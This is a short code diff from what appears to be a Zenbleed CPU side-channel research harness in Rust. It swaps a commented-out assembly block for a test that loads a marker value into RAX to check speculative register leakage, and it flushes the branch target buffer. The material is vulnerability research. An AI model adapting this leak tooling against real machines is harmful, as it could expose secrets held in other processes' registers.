@@ -101,26 +101,19 @@ impl Zenbleed {
     fn emit() -> X64Assembler {
         let mut f = X64Assembler::new().unwrap();
 
-        // Pollute the physical register file with values that will leaked
+        // Pollute the physical register file with values that will be leaked
         //Self::emit_leak_probe_1(&mut f, 0);
-        Self::emit_leak_spec_rax(&mut f, 32, |f| {
-            dynasm!(f
-                //; xor rbx, rbx
-                //; mov rbx, rax
-                //; mov [rsp+16], rbx
-                //; mov rax, [rsp+16]
-                //; stac
-                //; mov ecx, 1
-                //; mov rbx, QWORD 0x0100_0000_0000_0000
-                //; .bytes [0x0f, 0x01, 0xfd]
-                //; or rax, rbx
-                ; rdfsbase rax
-
-            );
-        });
         //Self::emit_probe_setup_1(&mut f, 0);
         //Self::emit_probe_setup_1(&mut f, 1);
         //Self::emit_probe_setup_1(&mut f, 2);
+
+        // Leak the value of RAX
+        Self::emit_leak_spec_rax(&mut f, 32, |f| {
+            dynasm!(f
+                ; xor rax, rax
+                ; mov rax, 0xdead_c0de
+            );
+        });
 
         // Flush the BTB with unconditional always-taken branches
         for _ in 0..0x4000 { dynasm!(f ; jmp >next ; next:); }
